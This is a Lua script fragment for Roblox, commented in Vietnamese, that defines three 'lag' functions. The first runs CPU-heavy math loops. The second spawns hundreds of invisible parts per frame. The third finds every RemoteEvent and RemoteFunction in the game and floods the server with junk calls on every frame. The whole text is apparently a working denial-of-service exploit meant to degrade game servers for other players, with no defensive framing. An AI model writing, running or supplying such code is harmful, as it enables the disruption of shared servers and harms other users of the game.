-- 1. VÔ SỐ VÒNG LẶP VÔ HẠN
local function loopHell()
    while lagEnabled do
        local a = 0
        for i = 1, 1000000 do
            a = a + i * math.random() / math.pi
            local b = math.sin(a) * math.cos(a) * math.tan(a)
            local c = math.sqrt(math.abs(b)) ^ 1.234
        end
        task.wait()
    end
end

-- 2. TẠO HÀNG NGHÌN PART RỒI XÓA
local function partSpam()
    while lagEnabled do
        for i = 1, 500 do
            local part = Instance.new("Part")
            part.Size = Vector3.new(1, 1, 1)
            part.Position = Vector3.new(math.random(-1000, 1000), math.random(-100, 500), math.random(-1000, 1000))
            part.Anchored = true
            part.Transparency = 1
            part.CanCollide = false
            part.Parent = Workspace
            task.spawn(function()
                task.wait(0.5)
                part:Destroy()
            end)
        end
        task.wait()
    end
end

-- 3. GỬI REMOTE ẢO LIÊN TỤC
local function remoteSpam()
    local remotes = {}
    for _, v in pairs(ReplicatedStorage:GetDescendants()) do
        if v:IsA("RemoteEvent") or v:IsA("RemoteFunction") then
            table.insert(remotes, v)
        end
    end
    
    while lagEnabled do
        for _, remote in pairs(remotes) do
            pcall(function()
                if remote:IsA("RemoteEvent") then
                    remote:FireServer("lag_spam_" .. math.random())
                elseif remote:IsA("RemoteFunction") then
                    remote:InvokeServer("lag_spam_" .. math.random())
                end
            end)
        end
        task.wait()
    end
end

